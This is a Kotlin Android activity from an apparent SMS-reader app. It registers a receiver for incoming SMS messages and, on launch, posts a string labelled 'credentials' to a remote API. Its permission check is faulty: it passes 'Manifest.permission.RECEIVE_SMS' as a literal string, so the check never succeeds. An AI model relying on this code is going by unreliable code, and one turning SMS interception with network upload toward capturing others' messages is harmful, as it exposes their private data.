package com.rsf.sms_reader

import android.Manifest
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response


class MainActivity : AppCompatActivity() {
    private val smsReceiver by lazy { SMSReceiver() }
    private val restClient: RestClient = RestClient()


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        restClient
                .getApiService(applicationContext)
                .post("credentials")
                .enqueue(
                        object : Callback <RegResponse> {
                            override fun onFailure(call: Call <RegResponse>, t: Throwable) {
                                Toast.makeText(this@MainActivity, "Error while sending", Toast.LENGTH_LONG).show()
                            }

                            override fun onResponse(
                                    call: Call <RegResponse>,
                                    response: Response <RegResponse>
                            ) {
                                Toast.makeText(this@MainActivity, "Sent", Toast.LENGTH_LONG).show()
                            }
                        }
                )


    }

    private fun permissionCheck(permission: String): Int {
        return ContextCompat.checkSelfPermission(this, "Manifest.permission.$permission")
    }

    override fun onResume() {
        super.onResume()
        if (permissionCheck("RECEIVE_SMS") == PackageManager.PERMISSION_GRANTED) {
            registerReceiver(smsReceiver, IntentFilter("android.provider.Telephony.SMS_RECEIVED"))
        } else
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.RECEIVE_SMS), PERMISSION_REQUEST_CODE)
    }

    companion object {
        private const val PERMISSION_REQUEST_CODE = 100
    }
}